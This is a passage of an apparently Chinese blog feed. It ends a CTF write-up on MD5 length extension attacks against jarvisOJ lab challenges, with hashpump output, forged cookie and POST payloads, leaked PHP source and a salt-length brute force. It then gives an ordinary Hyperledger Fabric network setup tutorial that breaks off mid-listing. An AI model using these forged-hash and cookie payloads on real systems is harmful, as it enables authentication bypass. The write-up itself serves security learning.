class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: kangel</span><br><span class="line">04dd497abe8ae2d3c5a7775c2056850e</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00kangel</span><br></pre></td></tr></table></figure><p>于是构造cookie：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getmein=04dd497abe8ae2d3c5a7775c2056850e</span><br></pre></td></tr></table></figure><p>构造post，需要将<code>\x</code>替换为<code>%</code>:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00kangel</span><br></pre></td></tr></table></figure><p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p><p><img src="/2019/04/05/hash-attack/4.JPG" alt=""></p><h3 id="题目二：salt长度未知"><a href="#题目二：salt长度未知" class="headerlink" title="题目二：salt长度未知"></a>题目二：salt长度未知</h3><p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p><p>查看源码，无提示。</p><p>抓包分析，发现cookie中包含信息：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: UM_distinctid=167a58b007e9-03c00e05130083-143d7240-100200-167a58b007f190; role=s%3A5%3A%22guest%22%3B; hsh=3a4727d57463f122833d9e732f94e4e0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>既然无任何源码信息，用源码泄露工具扫一波，发现：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://web.jarvisoj.com:32778/index.php~</span></span><br></pre></td></tr></table></figure><p>漏洞朔源：一般网站管理员在日常维护中，总会把网站源码给备份一下，防止网站出现问题时，能马上的恢复使用，不过一般的管理员安全意识不高，在备份的时候，会使用一些常见的压缩备份名以及文件名，而且不光使用常见的备份名字，大部分的管理还会把备份好的源码直接放在网站根目录里。因此很容易被攻击者利用。</p><p>该文件为index.php备份文件，先将文件名该文index.php.swp，再使用vim进行恢复</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure><p>得到源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    body &#123;</span></span><br><span class="line"><span class="undefined">        background:gray;</span></span><br><span class="line"><span class="undefined">        text-align:center;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">        $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        $role = <span class="string">"guest"</span>;</span></span><br><span class="line"><span class="php">        $salt = </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span></span><br><span class="line"><span class="php">            $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span></span><br><span class="line"><span class="php">            $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span></span><br><span class="line"><span class="php">                $auth = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            $s = serialize($role);</span></span><br><span class="line"><span class="php">            setcookie(<span class="string">'role'</span>,$s);</span></span><br><span class="line"><span class="php">            $hsh = md5($salt.strrev($s));</span></span><br><span class="line"><span class="php">            setcookie(<span class="string">'hsh'</span>,$hsh);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($auth) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    <span class="meta">?&gt;</span></span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>熟悉的味道，首先要满足<code>$role===&quot;admin&quot;</code>，对“admin”进行序列化得到<code>;&quot;nimda&quot;:5:s</code>，而字节填充和strrev()刚好利用unserialize()的%00截断漏洞：</p><p>漏洞分析：</p><p><img src="/2019/04/05/hash-attack/6.JPG" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$salt = $salt   <span class="comment">//长度未知</span></span><br><span class="line">$string1 = strrev(serialize($role)) = ;<span class="string">"tseug"</span>:<span class="number">5</span>:s</span><br><span class="line">md5($salt.string1) = “<span class="number">3</span>a4727d57463f122833d9e732f94e4e0”  <span class="comment">//cookie中的hsh </span></span><br><span class="line">$string2 = ;<span class="string">"nimda"</span>:<span class="number">5</span>:s</span><br></pre></td></tr></table></figure><p>现在用hashpump计算<code>md5($salt.strrev($_COOKIE[&quot;role&quot;]))</code>，salt长度对hash值计算无影响，假设为10</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0</span><br><span class="line">Input Data: ;<span class="string">"tseug"</span>:5:s</span><br><span class="line">Input Key Length: 10</span><br><span class="line">Input Data to Add: ;<span class="string">"nimda"</span>:5:s</span><br><span class="line">fcdc3840332555511c4e4323f6decb07</span><br><span class="line">;<span class="string">"tseug"</span>:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\x00\x00\x00\x00\x00\x00\x00;<span class="string">"nimda"</span>:5:s</span><br></pre></td></tr></table></figure><p>得到cookie中的hsh：<code>fcdc3840332555511c4e4323f6decb07</code>，对padding值进行反转，将<code>\x</code>替换为<code>%</code>，进行URL编码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=s%3a5%3a"admin"%3b%00%00%00%00%00%00%00%b0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a"guest"%3b</span><br></pre></td></tr></table></figure><p>利用burp进行爆破，最多64次，这里取salt长度为10,11,12,13,14,15作为演示，选取<code>%b0%00%00%00%00%00</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%b0%00%00%00%00%00</span><br><span class="line">%b8%00%00%00%00</span><br><span class="line">%c0%00%00%00</span><br><span class="line">%c8%00%00</span><br><span class="line">%d0%00</span><br><span class="line">%d8</span><br></pre></td></tr></table></figure><p><img src="/2019/04/05/hash-attack/5.JPG" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;hash原理（以MD5为例）&quot;&gt;&lt;a href=&quot;#hash原理（以MD5为例）&quot; class=&quot;headerlink&quot; title=&quot;hash原理（以MD5为例）&quot;&gt;&lt;/a&gt;hash原理（以MD5为例）&lt;/h3&gt;&lt;h4 id=&quot;原理浅析&quot;&gt;&lt;a href=&quot;#原
      
    
    </summary>
    
      <category term="web" scheme="https://j-kangel.github.io/categories/web/"/>
    
      <category term="jarvisOJ" scheme="https://j-kangel.github.io/categories/web/jarvisOJ/"/>
    
    
      <category term="crypto" scheme="https://j-kangel.github.io/tags/crypto/"/>
    
      <category term="web" scheme="https://j-kangel.github.io/tags/web/"/>
    
      <category term="MD5" scheme="https://j-kangel.github.io/tags/MD5/"/>
    
      <category term="源码泄露" scheme="https://j-kangel.github.io/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
      <category term="序列化" scheme="https://j-kangel.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>trade-finance-logistics网络运行与分析</title>
    <link href="https://j-kangel.github.io/2019/03/28/trade-finance/"/>
    <id>https://j-kangel.github.io/2019/03/28/trade-finance/</id>
    <published>2019-03-27T23:19:03.000Z</published>
    <updated>2019-04-04T06:55:37.664Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、trade-finance-logistics网络介绍"><a href="#一、trade-finance-logistics网络介绍" class="headerlink" title="一、trade-finance-logistics网络介绍"></a>一、trade-finance-logistics网络介绍</h3><h4 id="1、工作交易流程"><a href="#1、工作交易流程" class="headerlink" title="1、工作交易流程"></a>1、工作交易流程</h4><p>工作流程中的交易如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. 进口商要求出口商提供货物以换取货币</span><br><span class="line">2. 出口商接受贸易协议</span><br><span class="line">3. 进口商要求银行提供有利于出口商的信用证</span><br><span class="line">4. 进口商的银行提供有利于出口商的信用证，并可支付给后者的银行</span><br><span class="line">5. 出口商的银行代表出口商接受信用证</span><br><span class="line">6. 出口商向监管机构申请E / L.</span><br><span class="line">7. 监管机构向出口商提供E / L.</span><br><span class="line">8. 出口商准备一批货物并将其交给承运人</span><br><span class="line">9. 承运人在确认E / L后接受货物，然后向出口商提供提单</span><br><span class="line">10. 出口商的银行要求进口商银行支付一半的款项</span><br><span class="line">11. 进口商的银行将一半的金额转移到出口商的银行</span><br><span class="line">12. 承运人将货物运至目的地</span><br><span class="line">13. 进口商的银行向出口商的银行支付剩余金额</span><br></pre></td></tr></table></figure><p>这是一个解释交易工作流程的图表：</p><p><img src="/2019/03/28/trade-finance/1.png" alt=""></p><h4 id="2、构建fabric网络"><a href="#2、构建fabric网络" class="headerlink" title="2、构建fabric网络"></a>2、构建fabric网络</h4><p>样本贸易网络将由四个组织组成，分别代表出口商，进口商，承运商和监管机构。后两者分别代表运营商和监管机构实体。但是，出口组织既代表出口实体又代表其银行。同样，进口商组织代表进口实体及其银行。如下图所示：</p><p><img src="/2019/03/28/trade-finance/2.png" alt=""></p><h3 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h3><h4 id="1、hyperledger-fabric环境搭建"><a href="#1、hyperledger-fabric环境搭建" class="headerlink" title="1、hyperledger fabric环境搭建"></a>1、hyperledger fabric环境搭建</h4><p>具体过程见<a href="https://j-kangel.github.io/2019/03/24/hyperledger/">https://j-kangel.github.io/2019/03/24/hyperledger/</a></p><h4 id="2、trade-finance-logistics网络的下载"><a href="#2、trade-finance-logistics网络的下载" class="headerlink" title="2、trade-finance-logistics网络的下载"></a>2、trade-finance-logistics网络的下载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src  </span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/HyperledgerHandsOn/trade-finance-logistics.git</span><br></pre></td></tr></table></figure><h4 id="3、设置cryptogen环境变量"><a href="#3、设置cryptogen环境变量" class="headerlink" title="3、设置cryptogen环境变量"></a>3、设置cryptogen环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:~/go/src/github.com/hyperledger/fabric/fabric-samples/bin</span><br><span class="line">$ cryptogen version   <span class="comment">#测试是否生效</span></span><br><span class="line">cryptogen:</span><br><span class="line"> Version: 1.4.0</span><br><span class="line"> Commit SHA: d700b43</span><br><span class="line"> Go version: go1.11.1</span><br><span class="line"> OS/Arch: linux/amd64</span><br></pre></td></tr></table></figure><h4 id="4、更改配置文件configtx-yaml"><a href="#4、更改配置文件configtx-yaml" class="headerlink" title="4、更改配置文件configtx.yaml"></a>4、更改配置文件configtx.yaml</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> go/src/trade-finance-logistics/network</span><br><span class="line">$ gedit configtx.yaml</span><br></pre></td></tr></table></figure><p>将以下内容移至文件末尾，这是因为hyperledger fabric1.4更新的语法规则</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Profiles:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    FourOrgsTradeOrdererGenesis:</span></span><br><span class="line"><span class="attr">        Capabilities:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelCapabilities</span></span><br><span class="line"><span class="attr">        Orderer:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*TradeOrdererOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererCapabilities</span></span><br><span class="line"><span class="attr">        Consortiums:</span></span><br><span class="line"><span class="attr">            TradeConsortium:</span></span><br><span class="line"><span class="attr">                Organizations:</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">    FourOrgsTradeChannel:</span></span><br><span class="line"><span class="attr">        Consortium:</span> <span class="string">TradeConsortium</span></span><br><span class="line"><span class="attr">        Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationCapabilities</span></span><br></pre></td></tr></table></figure><h3 id="三、创建channel并运行网络"><a href="#三、创建channel并运行网络" class="headerlink" title="三、创建channel并运行网络"></a>三、创建channel并运行网络</h3><h4 id="1、创建通道channel"><a href="#1、创建通道channel" class="headerlink" title="1、创建通道channel"></a>1、创建通道channel</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> go/src/trade-finance-logistics/network</span><br><span class="line">$ ./trade.sh generate -c tradechannel</span><br></pre></td></tr></table></figure><p>此时会创建一个排序节点（orderer）和四个对等锚节点（ImporterOrg、ExporterOrg、RegulatorOrg、CarrierOrg），并生成相应的配置文件，稍后详细分析。</p><h4 id="2、启动网络"><a href="#2、启动网络" class="headerlink" title="2、启动网络"></a>2、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./trade.sh up -c tradechannel</span><br></pre></td></tr></table></figure><p>启动成功后显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Starting with channel <span class="string">'tradechannel'</span></span><br><span class="line">Continue? [Y/n] </span><br><span class="line">proceeding ...</span><br><span class="line">LOCAL_VERSION=1.4.0</span><br><span class="line">DOCKER_IMAGE_VERSION=1.4.0</span><br></pre></td></tr></table></figure><h4 id="3、关闭网络"><a href="#3、关闭网络" class="headerlink" title="3、关闭网络"></a>3、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./trade.sh down -c tradechannel</span><br></pre></td></tr></table></figure><p>关闭成功后显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Stopping ca_peerImporterOrg           ... <span class="keyword">done</span>    <span class="comment">#停止进口商节点证书</span></span><br><span class="line">Stopping ca_peerRegulatorOrg          ... <span class="keyword">done</span></span><br><span class="line">Stopping ca_peerExporterOrg           ... <span class="keyword">done</span></span><br><span class="line">Stopping ca_peerCarrierOrg            ... <span class="keyword">done</span></span><br><span class="line">Stopping peer0.importerorg.trade.com  ... <span class="keyword">done</span>    <span class="comment">#停止进口商节点</span></span><br><span class="line">Stopping peer0.carrierorg.trade.com   ... <span class="keyword">done</span></span><br><span class="line">Stopping peer0.regulatororg.trade.com ... <span class="keyword">done</span></span><br><span class="line">Stopping orderer.trade.com            ... <span class="keyword">done</span></span><br><span class="line">Stopping peer0.exporterorg.trade.com  ... <span class="keyword">done</span></span><br><span class="line">Removing ca_peerImporterOrg           ... <span class="keyword">done</span>    <span class="comment">#移除进口商节点证书</span></span><br><span class="line">Removing ca_peerRegulatorOrg          ... <span class="keyword">done</span></span><br><span class="line">Removing ca_peerExporterOrg           ... <span class="keyword">done</span></span><br><span class="line">Removing ca_peerCarrierOrg            ... <span class="keyword">done</span></span><br><span class="line">Removing peer0.importerorg.trade.com  ... <span class="keyword">done</span>    <span class="comment">#移除进口商节点</span></span><br><span class="line">Removing peer0.carrierorg.trade.com   ... <span class="keyword">done</span></span><br><span class="line">Removing peer0.regulatororg.trade.com ... <span class="keyword">done</span></span><br><span class="line">Removing orderer.trade.com            ... <span class="keyword">done</span></span><br><span class="line">Removing peer0.exporterorg.trade.com  ... <span class="keyword">done</span></span><br><span class="line">Removing network net_trade</span><br><span class="line">Removing volume net_orderer.trade.com</span><br><span class="line">Removing volume net_peer0.exporterorg.trade.com</span><br><span class="line">Removing volume net_peer0.importerorg.trade.com</span><br><span class="line">Removing volume net_peer0.regulatororg.trade.com</span><br><span class="line">Removing volume net_peer0.carrierorg.trade.com</span><br></pre></td></tr></table></figure><h3 id="四、生成通道文件分析"><a href="#四、生成通道文件分析" class="headerlink" title="四、生成通道文件分析"></a>四、生成通道文件分析</h3><h4 id="1、网络加密材料配置文件crypto-config-yaml剖析"><a href="#1、网络加密材料配置文件crypto-config-yaml剖析" class="headerlink" title="1、网络加密材料配置文件crypto-config.yaml剖析"></a>1、网络加密材料配置文件crypto-config.yaml剖析</h4><p>该网络包含一个排序组织和四个对等节点组织，具体关系如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># "OrdererOrgs" - Definition of organizations managing orderer nodes</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">OrdererOrgs:</span>  <span class="comment">##管理orderer节点的组织的定义</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">TradeOrderer</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># "PeerOrgs" - Definition of organizations managing peer nodes</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">PeerOrgs:</span>    <span class="comment">##管理Peer节点的组织的定义</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">ExporterOrg</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">ImporterOrg</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">CarrierOrg</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">RegulatorOrg</span></span><br></pre></td></tr></table></figure><p>每个组织都有各自的属性，下面以ImporterOrg为例</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ImporterOrg</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">- Name:</span> <span class="string">ImporterOrg</span>     <span class="comment">##组织名称</span></span><br><span class="line"><span class="attr">  Domain:</span> <span class="string">importerorg.trade.com</span>   <span class="comment">##组织域名</span></span><br><span class="line"><span class="attr">  EnableNodeOUs:</span> <span class="literal">true</span>             <span class="comment">##如果设置了EnableNodeOUs，就在msp下生成config.yaml文件</span></span><br><span class="line"><span class="attr">  Template:</span></span><br><span class="line"><span class="attr">    Count:</span> <span class="number">1</span>            <span class="comment">##表示生成一个peer</span></span><br><span class="line"><span class="attr">  Users:</span></span><br><span class="line"><span class="attr">    Count:</span> <span class="number">2</span>            <span class="comment">##表示生成两个普通用户</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><h4 id="2、生成所有组织加密材料"><a href="#2、生成所有组织加密材料" class="headerlink" title="2、生成所有组织加密材料"></a>2、生成所有组织加密材料</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cryptogen generate --config=./crypto-config.yaml  <span class="comment">##./trade.sh generate第一部分</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree -L 2 crypto-config   <span class="comment">##查看crypto-config的二级目录</span></span><br><span class="line">crypto-config</span><br><span class="line">├── ordererOrganizations    <span class="comment">##order组织只有一个</span></span><br><span class="line">│   └── trade.com</span><br><span class="line">└── peerOrganizations       <span class="comment">##peer组织有四个</span></span><br><span class="line">    ├── carrierorg.trade.com</span><br><span class="line">    ├── exporterorg.trade.com</span><br><span class="line">    ├── importerorg.trade.com</span><br><span class="line">    └── regulatororg.trade.com</span><br></pre></td></tr></table></figure><p>现在以trade.com为例进行展开分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ tree  crypto-config/ordererOrganizations/trade.com/</span><br><span class="line">crypto-config/ordererOrganizations/trade.com/</span><br><span class="line">├── ca   <span class="comment">## 存放组织根证书及私钥(采用EC算法)证书为【自签名】，组织内的实体将给予该根证书作为证书根</span></span><br><span class="line">│   ├── ca.trade.com-cert.pem  <span class="comment">## 证书CA</span></span><br><span class="line">│   └── d046c897334d539608c5fa578e7686441ec41115702ff8105e22998785839612_sk  <span class="comment">## 私钥</span></span><br><span class="line">├── msp  <span class="comment">## 存放该组织身份信息</span></span><br><span class="line">│   ├── admincerts  <span class="comment">## 组织管理员身份验证证书，【被根证书签名】</span></span><br><span class="line">│   │   └── Admin@trade.com-cert.pem  </span><br><span class="line">│   ├── cacerts     <span class="comment">## 组织的根证书 【和CA目录里面一致】</span></span><br><span class="line">│   │   └── ca.trade.com-cert.pem  </span><br><span class="line">│   └── tlscacerts  <span class="comment">## 用于TLS的CA证书，【自签名】</span></span><br><span class="line">│       └── tlsca.trade.com-cert.pem</span><br><span class="line">├── orderers  <span class="comment">## 存放所有 Orderer 的身份信息</span></span><br><span class="line">│   └── orderer.trade.com   <span class="comment">## 